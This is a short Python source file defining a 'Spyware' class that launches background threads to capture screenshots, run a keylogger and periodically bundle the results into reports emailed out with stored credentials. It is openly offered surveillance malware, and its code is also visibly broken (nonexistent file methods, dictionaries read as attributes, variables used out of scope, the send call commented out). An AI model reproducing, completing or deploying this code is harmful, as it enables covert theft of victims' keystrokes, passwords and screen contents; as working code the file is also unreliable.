from time import sleep
from threading import Thread
import cv2
import os
from PIL import Image
import shutil
from functools import partial
import multiprocessing
import json
import random

from modules.log import Logger
from modules.grab_screen import Visual
from modules.send_email import send_mail


class Spyware:
    def __init__(self):
        self.keylogger_report = ''
        self.screenshot_period = 5

        with open('./user_info/info.json') as input_file:
            reader = input_file.reader()
            self.user_info = json.loads(reader)

        self.audio_period = self.user_info.frequency - 2

    def start(self):
        user_path = os.path.expanduser('~\\documents')
        logger = Logger()
        visual = Visual(self.screenshot_period)

        if not os.path.isdir(f'{user_path}\\images_record'):
            os.mkdir(f'{user_path}\\images_record')

        async_tasks = [
                Thread(target=visual.make_screenshot, daemon=True),
                Thread(target=logger.init, daemon=True),
                Thread(target=self.reporting, daemon=True)
        ]

        [t.start() for t in async_tasks]

    def reporting(self):
        while True:
            sleep(self.user_info.frequency)
            visual.make_pdf()
            log = logger.get_log()

            # self.send_report()

    def send_report(self, file_path):
        message_rep = 'Full report (keylogger + screenshots + audio)'
        try:
            send_mail(self.user_info.email, self.user_info.password, message_rep, 'Spyware report', file_path)
        except:
            error_msg = 'Could not send that'
            send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)


if __name__ == '__main__':
    multiprocessing.freeze_support()

    spw = Spyware()
    spw.start()
